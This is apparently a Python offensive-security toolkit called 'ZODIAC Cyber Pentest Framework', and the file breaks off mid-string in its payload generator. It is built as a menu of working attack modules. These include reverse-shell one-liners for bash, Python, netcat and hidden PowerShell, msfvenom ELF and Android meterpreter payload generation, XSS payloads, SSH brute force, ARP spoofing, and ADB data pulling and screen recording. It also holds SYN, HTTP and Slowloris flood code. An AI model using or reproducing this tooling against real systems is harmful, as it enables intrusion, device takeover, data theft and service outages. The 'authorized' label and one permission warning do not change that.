#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#   ███████╗ ██████╗ ██████╗ ██╗ █████╗  ██████╗
#   ╚══███╔╝██╔═══██╗██╔══██╗██║██╔══██╗██╔════╝
#     ███╔╝ ██║   ██║██║  ██║██║███████║██║
#    ███╔╝  ██║   ██║██║  ██║██║██╔══██║██║
#   ███████╗╚██████╔╝██████╔╝██║██║  ██║╚██████╗
#   ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝ ╚═════╝
# ============================================================
#   ZODIAC — Cyber Pentest Framework v3.0
#   Authorized Penetration Testing Tool
#   Platform: Linux / Android (Termux)
#   Modes: Root & Non-Root
# ============================================================

import os
import sys
import subprocess
import platform
import socket
import json
import time
import random
import threading
import signal
import readline
import inspect
from datetime import datetime
from typing import Optional, List, Dict, Callable

# ---------- COLOR SYSTEM ----------
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; C = '\033[96m'; W = '\033[97m'; BL = '\033[90m'
    BG_R = '\033[101m'; BG_G = '\033[102m'; BG_B = '\033[104m'
    BG_M = '\033[105m'; BG_C = '\033[106m'; BG_Y = '\033[103m'
    BD = '\033[1m'; DM = '\033[2m'; RS = '\033[0m'; RV = '\033[7m'

# ---------- ZODIAC LOGO ----------
LOGO = f"""
{C.BG_B}{C.BL}{C.BD}
╔══════════════════════════════════════════════════════════════╗
║            ███████╗ ██████╗ ██████╗ ██╗ █████╗  ██████╗     ║
║            ╚══███╔╝██╔═══██╗██╔══██╗██║██╔══██╗██╔════╝    ║
║              ███╔╝ ██║   ██║██║  ██║██║███████║██║          ║
║             ███╔╝  ██║   ██║██║  ██║██║██╔══██║██║          ║
║            ███████╗╚██████╔╝██████╔╝██║██║  ██║╚██████╗     ║
║            ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝ ╚═════╝     ║
║            ═══════════════════════════════════════════        ║
║         {C.R}☠{C.B}{C.BD}  CYBER PENTEST FRAMEWORK v3.0 — ZODIAC  {C.R}☠{C.B}{C.BD}      ║
║         ═══════════════════════════════════════════          ║
║     {C.Y}{C.BD}⚡ The Zodiac Hacker's Arsenal — Own The Night ⚡{C.B}{C.BD}   ║
╚══════════════════════════════════════════════════════════════╝
{C.RS}"""

# ---------- ASCII ZODIAC EMBLEM ----------
ZODIAC_EMBLEM = f"""
{C.RS}{C.BL}{C.BD}
                ╭─────────────────────╮
                │      ☽ ☿ ♀ ♂ ♃ ♄     │
                │   ╔═══════════════╗  │
                │   ║  Z O D I A C ║  │
                │   ╚═══════════════╝  │
                │    ────═══───═══──  │
                │  ⚔  PENTEST KIT  ⚔  │
                ╰─────────────────────╯
       ╔═══════════════════════════════════════════╗
       ║  {C.R}▲{C.BL}  RECON  {C.Y}►{C.BL}  EXPLOIT  {C.G}►{C.BL}  ESCALATE  {C.M}►{C.BL}  PWN  {C.BL}║
       ╚═══════════════════════════════════════════╝
{C.RS}"""

# ---------- SYSTEM INFO ----------
IS_ROOT = os.geteuid() == 0
IS_ANDROID = 'com.termux' in os.environ.get('PREFIX', '') or os.path.exists('/data/data/com.termux')
IS_LINUX = platform.system() == 'Linux'

# ---------- UTILITY FUNCTIONS ----------
def clear(): os.system('cls' if os.name == 'nt' else 'clear')

def pause():
    input(f"\n{C.C}{C.BD}[PRESS ENTER TO CONTINUE...]{C.RS}")

def status_bar(text, color=C.C):
    w = os.get_terminal_size().columns - 4
    print(f"{C.BL}║{C.RS} {color}{C.BD}{text.center(w)}{C.RS} {C.BL}║{C.RS}")

def section_header(text, color=C.M):
    w = os.get_terminal_size().columns - 4
    print(f"\n{C.BL}╔{'═'*(w+2)}╗{C.RS}")
    print(f"{C.BL}║{C.RS} {color}{C.BD}{text.center(w)}{C.RS} {C.BL}║{C.RS}")
    print(f"{C.BL}╚{'═'*(w+2)}╝{C.RS}\n")

def menu_option(num, name, desc, color=C.G):
    print(f" {C.Y}{C.BD}[{num}]{C.RS} {color}{C.BD}{name}{C.RS}")
    print(f"     {C.BL}└─ {C.DM}{desc}{C.RS}")

def run_cmd(cmd, shell=False):
    try:
        if shell:
            return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        else:
            return subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    except subprocess.TimeoutExpired:
        return None

def check_tool(tool):
    r = run_cmd(['which', tool])
    return r.returncode == 0 if r else False

def print_result(success, msg, detail=""):
    icon = f"{C.G}✔{C.RS}" if success else f"{C.R}✘{C.RS}"
    col = C.G if success else C.R
    print(f" {icon} {col}{C.BD}{msg}{C.RS} {C.BL}{detail}{C.RS}")

def typing_effect(text, speed=0.03):
    for ch in text:
        print(ch, end='', flush=True)
        time.sleep(speed)
    print()

# ---------- ROOT STATUS ----------
def check_root():
    global IS_ROOT
    IS_ROOT = os.geteuid() == 0
    return IS_ROOT

def print_root_status():
    clear()
    print(LOGO)
    print(ZODIAC_EMBLEM)
    w = os.get_terminal_size().columns - 4
    print(f"\n{C.BL}{'═'*(w+4)}{C.RS}")
    if IS_ROOT:
        print(f"{C.BG_R}{C.BL}{C.BD} ⚡ ROOT ACCESS DETECTED ⚡ {C.RS}")
        print(f"{C.R}User ID: 0 (root){C.RS}")
        print(f"{C.G}All modules fully available — Full system access{C.RS}")
    else:
        print(f"{C.BG_Y}{C.BL}{C.BD} ⚠ LIMITED MODE (NO ROOT) ⚠ {C.RS}")
        print(f"{C.Y}Running without root privileges{C.RS}")
        print(f"{C.Y}Some modules (packet injection, raw sockets) disabled{C.RS}")
        print(f"{C.BL}Use option [0] to switch to root if you have sudo access{C.RS}")
    print(f"{C.BL}{'═'*(w+4)}{C.RS}\n")
    pause()

# ---------- MODULES ----------

# ── RECONNAISSANCE ──
def module_nmap_scan():
    section_header("🌐 NMAP PORT SCANNER", C.C)
    target = input(f" {C.Y}Target IP/Hostname → {C.RS}").strip()
    if not target: return
    scan_type = input(f" {C.Y}Scan type (quick/full/stealth/vuln) → {C.RS}").strip().lower() or "quick"
    flags = {'quick': '-T4 -F', 'full': '-p- -T4', 'stealth': '-sS -T2', 'vuln': '--script=vuln -T4'}
    f = flags.get(scan_type, '-T4 -F')
    print(f"\n{C.C}Scanning {C.BD}{target}{C.RS} with flags {f}...\n{C.RS}")
    r = run_cmd(f"nmap {f} {target}", shell=True)
    if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    if r and r.stderr: print(f"{C.R}{r.stderr}{C.RS}")
    if not r: print(f"{C.R}[!] Failed to run nmap{C.RS}")
    pause()

def module_subdomain_enum():
    section_header("🔍 SUBDOMAIN ENUMERATION", C.C)
    domain = input(f" {C.Y}Domain → {C.RS}").strip()
    if not domain: return
    if check_tool('sublist3r'):
        r = run_cmd(f"sublist3r -d {domain}", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    if check_tool('subfinder'):
        r = run_cmd(f"subfinder -d {domain} -silent", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    if not check_tool('sublist3r') and not check_tool('subfinder'):
        print(f"{C.Y}[!] Install sublist3r or subfinder for best results{C.RS}")
        # fallback: basic DNS
        for sub in ['www', 'mail', 'admin', 'api', 'dev', 'test', 'vpn', 'ftp']:
            try:
                ip = socket.gethostbyname(f"{sub}.{domain}")
                print(f" {C.G}✔ {sub}.{domain} → {ip}{C.RS}")
            except: pass
    pause()

def module_dns_enum():
    section_header("📡 DNS ENUMERATION", C.C)
    target = input(f" {C.Y}Target Domain → {C.RS}").strip()
    if not target: return
    cmds = [
        f"dig any {target} +short",
        f"dig mx {target} +short",
        f"dig ns {target} +short",
        f"dig axfr {target} @{target}",
    ]
    for cmd in cmds:
        print(f"\n{C.C}$ {cmd}{C.RS}")
        r = run_cmd(cmd, shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    pause()

def module_osint():
    section_header("🕵️ OSINT - WHOIS & INFO", C.C)
    target = input(f" {C.Y}Target (domain/email/ip) → {C.RS}").strip()
    if not target: return
    if check_tool('theharvester'):
        r = run_cmd(f"theharvester -d {target} -l 100 -b google", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout[:2000]}{C.RS}")
    if check_tool('whois'):
        r = run_cmd(f"whois {target}", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout[:1500]}{C.RS}")
    pause()

# ── EXPLOITATION ──
def module_sql_injection():
    section_header("💉 SQL INJECTION SCANNER", C.R)
    url = input(f" {C.Y}Target URL (e.g. http://site.com/page?id=1) → {C.RS}").strip()
    if not url: return
    if not check_tool('sqlmap'):
        print(f"{C.R}[!] sqlmap not installed. Install with: apt install sqlmap{C.RS}")
        pause()
        return
    level = input(f" {C.Y}Risk level (1-5) [default: 3] → {C.RS}").strip() or "3"
    print(f"\n{C.M}Running sqlmap on {url}...{C.RS}\n")
    r = run_cmd(f"sqlmap -u '{url}' --batch --level={level} --risk=3", shell=True)
    if r and r.stdout: print(f"{C.G}{r.stdout[-2000:]}{C.RS}")
    pause()

def module_xss_scanner():
    section_header("🔥 XSS VULNERABILITY SCANNER", C.R)
    url = input(f" {C.Y}Target URL → {C.RS}").strip()
    if not url: return
    param = input(f" {C.Y}Parameter to test (e.g. q, search, id) → {C.RS}").strip()
    payloads = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '<svg/onload=alert(1)>',
    ]
    import urllib.request
    for p in payloads:
        try:
            test_url = f"{url}?{param}={urllib.parse.quote(p)}"
            req = urllib.request.Request(test_url, headers={'User-Agent': 'ZODIAC/3.0'})
            resp = urllib.request.urlopen(req, timeout=5)
            body = resp.read().decode('utf-8', errors='ignore')
            if p in body:
                print(f" {C.R}{C.BD}[!] XSS DETECTED: {p}{C.RS}")
            else:
                print(f" {C.BL}[-] Not reflected: {p[:30]}{C.RS}")
        except Exception as e:
            print(f" {C.Y}[!] Error: {e}{C.RS}")
    pause()

def module_metasploit():
    section_header("🎯 METASPLOIT LAUNCHER", C.R)
    if not check_tool('msfconsole'):
        print(f"{C.R}[!] Metasploit not installed{C.RS}")
        pause()
        return
    print(f" {C.Y}1. Start msfconsole (interactive)")
    print(f" {C.Y}2. Quick reverse shell payload generator")
    ch = input(f" {C.Y}Choice → {C.RS}").strip()
    if ch == '1':
        os.system('msfconsole -q')
    elif ch == '2':
        lhost = input(f" {C.Y}Your IP (LHOST) → {C.RS}").strip()
        lport = input(f" {C.Y}Port (LPORT) → {C.RS}").strip() or "4444"
        print(f"\n{C.M}Generating payloads...{C.RS}\n")
        cmds = [
            f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o output/rev_shell_x64.elf",
            f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o output/rev_shell_x86.elf",
            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o output/zodiac_payload.apk",
        ]
        for cmd in cmds:
            print(f" {C.C}$ {cmd}{C.RS}")
            r = run_cmd(cmd, shell=True)
            print_result(r and r.returncode == 0, "Done", cmd.split('-o')[1] if '-o' in cmd else "")
    pause()

def module_reverse_shell_gen():
    section_header("🔄 REVERSE SHELL GENERATOR (ALL PLATFORMS)", C.R)
    lhost = input(f" {C.Y}LHOST (your IP) → {C.RS}").strip()
    lport = input(f" {C.Y}LPORT → {C.RS}").strip() or "4444"
    print(f"\n{C.G}{C.BD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RS}")
    print(f"{C.M}BASH:{C.RS}")
    print(f" bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    print(f"\n{C.M}PYTHON:{C.RS}")
    print(f" python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'")
    print(f"\n{C.M}NETCAT:{C.RS}")
    print(f" nc -e /bin/bash {lhost} {lport}")
    print(f" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f")
    print(f"\n{C.M}POWERSHELL (Windows):{C.RS}")
    print(f" powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sb2.Length);$s.Flush()}};$c.Close()\"")
    print(f"{C.G}{C.BD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RS}")
    pause()

# ── WEB ATTACK ──
def module_dir_buster():
    section_header("📁 DIRECTORY BUSTER", C.M)
    url = input(f" {C.Y}Target URL (e.g. http://site.com) → {C.RS}").strip()
    if not url: return
    wordlist = input(f" {C.Y}Wordlist path [default: /usr/share/wordlists/dirb/common.txt] → {C.RS}").strip()
    if not wordlist:
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        if not os.path.exists(wordlist):
            wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    if not os.path.exists(wordlist):
        print(f"{C.R}[!] No wordlist found. Using built-in small list{C.RS}")
        wordlist = None
    if wordlist and not check_tool('gobuster') and not check_tool('dirb'):
        print(f"{C.Y}[!] Installing gobuster...{C.RS}")
        run_cmd("apt install -y gobuster 2>/dev/null || apt install -y dirb 2>/dev/null", shell=True)
    if check_tool('gobuster') and wordlist:
        r = run_cmd(f"gobuster dir -u {url} -w {wordlist} -t 50 -q", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    elif check_tool('dirb') and wordlist:
        r = run_cmd(f"dirb {url} {wordlist} -S", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    else:
        print(f"{C.Y}[*] Using basic wordlist...{C.RS}")
        common = ['admin', 'login', 'wp-admin', 'backup', 'config', 'test', 'api', '.git', '.env', 'robots.txt']
        import urllib.request
        for d in common:
            try:
                u = f"{url.rstrip('/')}/{d}"
                req = urllib.request.Request(u, method='HEAD')
                resp = urllib.request.urlopen(req, timeout=3)
                if resp.status < 400:
                    print(f" {C.G}✔ Found: {u} [{resp.status}]{C.RS}")
            except: pass
    pause()

def module_wordpress_scan():
    section_header("🎯 WORDPRESS SCANNER", C.M)
    url = input(f" {C.Y}WordPress URL → {C.RS}").strip()
    if not url: return
    if check_tool('wpscan'):
        api_token = input(f" {C.Y}WPScan API token (or ENTER to skip) → {C.RS}").strip()
        token = f"--api-token {api_token}" if api_token else ""
        print(f"\n{C.M}Scanning WordPress...{C.RS}\n")
        r = run_cmd(f"wpscan {token} --url {url} --no-update", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout[-2500:]}{C.RS}")
    else:
        print(f"{C.Y}[!] Install wpscan: gem install wpscan{C.RS}")
        print(f"{C.Y}[*] Basic check only{C.RS}")
        endpoints = ['/wp-admin/', '/wp-login.php', '/xmlrpc.php', '/wp-content/', '/wp-json/']
        import urllib.request
        for ep in endpoints:
            try:
                u = f"{url.rstrip('/')}{ep}"
                req = urllib.request.Request(u)
                resp = urllib.request.urlopen(req, timeout=5)
                if resp.status < 400:
                    print(f" {C.G}✔ Found: {u}{C.RS}")
            except: pass
    pause()

# ── ANDROID / MOBILE ──
def module_android_payload():
    section_header("📱 ANDROID PAYLOAD GENERATOR", C.M)
    lhost = input(f" {C.Y}LHOST → {C.RS}").strip()
    lport = input(f" {C.Y}LPORT [4444] → {C.RS}").strip() or "4444"
    if not check_tool('msfvenom'):
        print(f"{C.R}[!] msfvenom not found. Install metasploit.{C.RS}")
        pause()
        return
    os.makedirs('output', exist_ok=True)
    print(f"\n{C.C}Generating Android payload...{C.RS}")
    r = run_cmd(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o output/zodiac_payload.apk", shell=True)
    if r and r.returncode == 0:
        print(f"{C.G}✔ Payload saved: output/zodiac_payload.apk{C.RS}")
        print(f"{C.Y}Sign with: jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore output/zodiac_payload.apk alias_name{C.RS}")
    else:
        print(f"{C.R}[!] Failed to generate{C.RS}")
        if r: print(r.stderr)
    pause()

def module_adb_hacking():
    section_header("📱 ADB HACKING TOOLS", C.M)
    if not check_tool('adb'):
        print(f"{C.R}[!] ADB not installed. Try: apt install android-tools-adb{C.RS}")
        pause()
        return
    print(f" {C.Y}1. List devices")
    print(f" {C.Y}2. Connect to device (TCP)")
    print(f" {C.Y}3. Install APK")
    print(f" {C.Y}4. Pull all data")
    print(f" {C.Y}5. Screen recording")
    print(f" {C.Y}6. Shell access")
    ch = input(f" {C.Y}Choice → {C.RS}").strip()
    if ch == '1':
        r = run_cmd("adb devices", shell=True)
        if r: print(r.stdout)
    elif ch == '2':
        ip = input(f" {C.Y}Device IP → {C.RS}").strip()
        r = run_cmd(f"adb connect {ip}:5555", shell=True)
        if r: print(r.stdout)
    elif ch == '3':
        apk = input(f" {C.Y}APK path → {C.RS}").strip()
        r = run_cmd(f"adb install {apk}", shell=True)
        if r: print(r.stdout)
    elif ch == '4':
        r = run_cmd("adb pull /sdcard/ output/android_data/", shell=True)
        if r: print(r.stdout)
    elif ch == '5':
        r = run_cmd("adb shell screenrecord /sdcard/zodiac_rec.mp4", shell=True)
        if r: print(r.stdout)
    elif ch == '6':
        os.system("adb shell")
    pause()

# ── PRIVILEGE ESCALATION ──
def module_linux_privesc():
    section_header("⬆️ LINUX PRIVILEGE ESCALATION CHECK", C.R)
    print(f"{C.Y}[*] Running privilege escalation checks...{C.RS}\n")
    
    checks = [
        ("Kernel version", "uname -a"),
        ("SUID binaries", "find / -perm -4000 2>/dev/null | head -30"),
        ("Writable /etc/passwd", "ls -la /etc/passwd"),
        ("Cron jobs", "ls -la /etc/cron* 2>/dev/null"),
        ("Sudo -l", "sudo -l 2>/dev/null"),
        ("Writable scripts in PATH", "for d in $(echo $PATH | tr ':' ' '); do find \"$d\" -writable -type f 2>/dev/null; done"),
        ("Docker group membership", "groups 2>/dev/null | grep -i docker"),
        ("Capabilities", "getcap -r / 2>/dev/null | head -20"),
    ]
    for name, cmd in checks:
        print(f" {C.C}[*] {name}{C.RS}")
        r = run_cmd(cmd, shell=True)
        if r and r.stdout:
            for line in r.stdout.strip().split('\n')[:5]:
                print(f"   {C.G}{line}{C.RS}")
        print()
    pause()

def module_enum_scripts():
    section_header("📜 AUTO ENUMERATION SCRIPTS", C.R)
    scripts = {
        '1': ('LinPEAS', 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'),
        '2': ('LinEnum', 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'),
        '3': ('Linux Exploit Suggester', 'https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh'),
    }
    for k, (n, _) in scripts.items():
        print(f" {C.Y}[{k}] {n}{C.RS}")
    ch = input(f"\n {C.Y}Choice → {C.RS}").strip()
    if ch in scripts:
        name, url = scripts[ch]
        print(f"\n{C.C}Downloading {name}...{C.RS}")
        import urllib.request
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'ZODIAC/3.0'})
            resp = urllib.request.urlopen(req, timeout=30)
            data = resp.read()
            path = f"output/{name.lower().replace(' ','_')}.sh"
            os.makedirs('output', exist_ok=True)
            with open(path, 'wb') as f: f.write(data)
            os.chmod(path, 0o755)
            print(f"{C.G}✔ Saved to {path}{C.RS}")
            run = input(f" {C.Y}Run now? (y/n) → {C.RS}").strip().lower()
            if run == 'y':
                r = run_cmd(f"bash {path}", shell=True)
                if r and r.stdout: print(f"{C.G}{r.stdout[-2000:]}{C.RS}")
        except Exception as e:
            print(f"{C.R}[!] Error: {e}{C.RS}")
    pause()

# ── NETWORK ──
def module_network_scanner():
    section_header("🌐 NETWORK SCANNER (LIVE HOSTS)", C.C)
    subnet = input(f" {C.Y}Subnet (e.g. 192.168.1.0/24) → {C.RS}").strip()
    if not subnet:
        subnet = "192.168.1.0/24"
    if check_tool('nmap'):
        r = run_cmd(f"nmap -sn {subnet} -T5", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    else:
        # basic ping sweep
        base = '.'.join(subnet.split('/')[0].split('.')[:-1])
        print(f"{C.Y}[*] Pinging {base}.1-254...{C.RS}")
        for i in range(1, 255):
            ip = f"{base}.{i}"
            r = run_cmd(f"ping -c 1 -W 1 {ip}", shell=True)
            if r and r.returncode == 0:
                print(f" {C.G}✔ {ip} is alive{C.RS}")
    pause()

def module_arp_spoof():
    section_header("🌐 ARP SPOOFING TOOL (ROOT REQUIRED)", C.R)
    if not IS_ROOT:
        print(f"{C.R}[!] Root access required for ARP spoofing{C.RS}")
        pause()
        return
    target = input(f" {C.Y}Target IP → {C.RS}").strip()
    gateway = input(f" {C.Y}Gateway IP → {C.RS}").strip()
    if not target or not gateway: return
    if not check_tool('arpspoof'):
        print(f"{C.Y}[!] Installing dsniff...{C.RS}")
        run_cmd("apt install -y dsniff", shell=True)
    print(f"\n{C.R}[!] Starting ARP spoof... Ctrl+C to stop{C.RS}")
    print(f"{C.C}Target: {target}  Gateway: {gateway}{C.RS}\n")
    cmd1 = f"arpspoof -i $(ip route | grep default | awk '{{print $5}}') -t {target} {gateway} &"
    cmd2 = f"arpspoof -i $(ip route | grep default | awk '{{print $5}}') -t {gateway} {target} &"
    try:
        os.system(cmd1)
        os.system(cmd2)
        input(f"{C.Y}[*] Press ENTER to stop...{C.RS}")
        os.system("killall arpspoof 2>/dev/null")
    except KeyboardInterrupt:
        os.system("killall arpspoof 2>/dev/null")
    pause()

# ── CRYPTO ──
def module_hash_cracker():
    section_header("🔐 HASH CRACKER", C.Y)
    h = input(f" {C.Y}Hash → {C.RS}").strip()
    if not h: return
    wordlist = input(f" {C.Y}Wordlist path [default: /usr/share/wordlists/rockyou.txt] → {C.RS}").strip()
    if not wordlist: wordlist = "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wordlist):
        print(f"{C.Y}[!] Wordlist not found. Using small internal list{C.RS}")
        wordlist = None
    hash_type = input(f" {C.Y}Hash type (md5/sha1/sha256/sha512/auto) [auto] → {C.RS}").strip().lower() or "auto"
    if hash_type == "auto":
        lengths = {32: 'md5', 40: 'sha1', 64: 'sha256', 128: 'sha512'}
        hash_type = lengths.get(len(h), 'md5')
        print(f" {C.BL}[*] Detected: {hash_type}{C.RS}")
    if check_tool('hashcat') and wordlist:
        mode_map = {'md5': '0', 'sha1': '100', 'sha256': '1400', 'sha512': '1700'}
        m = mode_map.get(hash_type, '0')
        r = run_cmd(f"hashcat -m {m} -a 0 '{h}' '{wordlist}' --force -O", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout[-1000:]}{C.RS}")
    else:
        import hashlib
        common = ['123456', 'password', 'admin', '12345678', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon', 'football']
        for p in common:
            if hash_type == 'md5' and hashlib.md5(p.encode()).hexdigest() == h: print(f"{C.G}✔ Found: {p}{C.RS}"); break
            elif hash_type == 'sha1' and hashlib.sha1(p.encode()).hexdigest() == h: print(f"{C.G}✔ Found: {p}{C.RS}"); break
            elif hash_type == 'sha256' and hashlib.sha256(p.encode()).hexdigest() == h: print(f"{C.G}✔ Found: {p}{C.RS}"); break
    pause()

# ── WIRELESS ──
def module_wifi_scan():
    section_header("📶 WIFI SCANNING", C.C)
    if not IS_ROOT:
        print(f"{C.Y}[!] Running in limited mode (no raw sockets){C.RS}")
    if check_tool('airodump-ng'):
        iface = input(f" {C.Y}Interface [wlan0] → {C.RS}").strip() or "wlan0"
        print(f"\n{C.C}Scanning on {iface}... (15 seconds){C.RS}\n")
        r = run_cmd(f"timeout 15 airodump-ng {iface} --band abg 2>/dev/null", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    elif check_tool('nmcli'):
        r = run_cmd("nmcli dev wifi list", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    else:
        print(f"{C.Y}[*] Install aircrack-ng or nmcli for WiFi scanning{C.RS}")
    pause()

# ── UTILITIES ──
def module_mac_changer():
    section_header("🔀 MAC ADDRESS CHANGER", C.C)
    if not IS_ROOT:
        print(f"{C.R}[!] Root required for MAC change{C.RS}")
        pause()
        return
    iface = input(f" {C.Y}Interface [wlan0] → {C.RS}").strip() or "wlan0"
    new_mac = input(f" {C.Y}New MAC (or RANDOM) → {C.RS}").strip()
    if new_mac.upper() == "RANDOM" or not new_mac:
        new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
    print(f"\n{C.C}Changing MAC of {iface} to {new_mac}...{C.RS}")
    cmds = [
        f"ip link set {iface} down",
        f"ip link set {iface} address {new_mac}",
        f"ip link set {iface} up"
    ]
    for cmd in cmds:
        r = run_cmd(cmd, shell=True)
        print_result(r and r.returncode == 0, cmd)
    r = run_cmd(f"ip link show {iface}", shell=True)
    if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    pause()

def module_ddos_stress():
    section_header("💥 STRESS TEST TOOLS", C.R)
    print(f"{C.Y}⚠ These tools should only be used on systems you own or have written permission to test!{C.RS}\n")
    target = input(f" {C.Y}Target IP/URL → {C.RS}").strip()
    if not target: return
    print(f" {C.Y}1. SYN Flood (requires root)")
    print(f" {C.Y}2. HTTP Flood")
    print(f" {C.Y}3. Slowloris")
    ch = input(f" {C.Y}Choice → {C.RS}").strip()
    if ch == '1' and IS_ROOT:
        port = input(f" {C.Y}Target port [80] → {C.RS}").strip() or "80"
        print(f"{C.R}[!] Sending SYN packets to {target}:{port}{C.RS}")
        run_cmd(f"hping3 -S -p {port} --flood {target}", shell=True)
    elif ch == '2':
        import urllib.request
        def flood():
            while True:
                try:
                    req = urllib.request.Request(f"http://{target}/", headers={'User-Agent': 'ZODIAC/3.0'})
                    urllib.request.urlopen(req, timeout=2)
                except: pass
        threads = []
        print(f"{C.R}[!] Starting HTTP flood with 50 threads...{C.RS}")
        for _ in range(50):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            threads.append(t)
        input(f"{C.Y}Press ENTER to stop...{C.RS}")
    elif ch == '3':
        print(f"{C.R}[!] Slowloris attack on {target}{C.RS}")
        if check_tool('slowloris'):
            run_cmd(f"slowloris {target}", shell=True)
        else:
            import socket
            sockets = []
            for _ in range(200):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, 80))
                    s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
                    sockets.append(s)
                except: break
            print(f"{C.G}✔ {len(sockets)} connections kept alive{C.RS}")
            input(f"{C.Y}Press ENTER to close...{C.RS}")
            for s in sockets: s.close()
    pause()

def module_ssh_bruteforce():
    section_header("🔑 SSH BRUTE FORCE", C.R)
    target = input(f" {C.Y}Target IP → {C.RS}").strip()
    user = input(f" {C.Y}Username [root] → {C.RS}").strip() or "root"
    passlist = input(f" {C.Y}Password list path → {C.RS}").strip()
    if not target or not passlist: return
    if not os.path.exists(passlist):
        print(f"{C.R}[!] Password list not found{C.RS}")
        pause()
        return
    if check_tool('hydra'):
        print(f"\n{C.C}Starting hydra brute force...{C.RS}\n")
        r = run_cmd(f"hydra -l {user} -P {passlist} {target} ssh -t 4 -V", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout[-2000:]}{C.RS}")
    else:
        print(f"{C.Y}[!] Install hydra: apt install hydra{C.RS}")
    pause()

# ── FORENSICS ──
def module_forensics():
    section_header("🔬 FORENSICS & LOG ANALYSIS", C.C)
    print(f" {C.Y}1. Analyze auth.log")
    print(f" {C.Y}2. Find modified files (last 24h)")
    print(f" {C.Y}3. Memory dump analysis (requires root)")
    print(f" {C.Y}4. Network connections")
    ch = input(f" {C.Y}Choice → {C.RS}").strip()
    if ch == '1':
        for p in ['/var/log/auth.log', '/var/log/secure', '/var/log/syslog']:
            if os.path.exists(p):
                r = run_cmd(f"grep -E '(Failed|Accepted|Invalid)' {p} | tail -50", shell=True)
                if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    elif ch == '2':
        r = run_cmd("find / -mmin -1440 -type f 2>/dev/null | head -50", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    elif ch == '3':
        if IS_ROOT and check_tool('lime'):
            print(f"{C.C}Loading LiME module...{C.RS}")
            run_cmd("insmod lime.ko path=output/memory.dump format=lime 2>/dev/null", shell=True)
        else:
            print(f"{C.Y}[!] LiME not available. Try: apt install lime{C.RS}")
    elif ch == '4':
        r = run_cmd("ss -tulanp 2>/dev/null || netstat -tulanp 2>/dev/null", shell=True)
        if r and r.stdout: print(f"{C.G}{r.stdout}{C.RS}")
    pause()

# ── PAYLOAD GENERATION ──
def module_payloads():
    section_header("💀 CUSTOM PAYLOAD GENERATOR", C.R)
    lhost = input(f" {C.Y}LHOST → {C.RS}").strip()
    lport = input(f" {C.Y}LPORT → {C.RS}").strip() or "4444"
    print(f"\n{C.G}{C.BD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RS}")
    print(f"{C.M}1. Python Reverse Shell{C.RS}")
    print(f""" {C.BL}{C.BD}python3 -c '
import socket,os,pty
s=socket.socket()
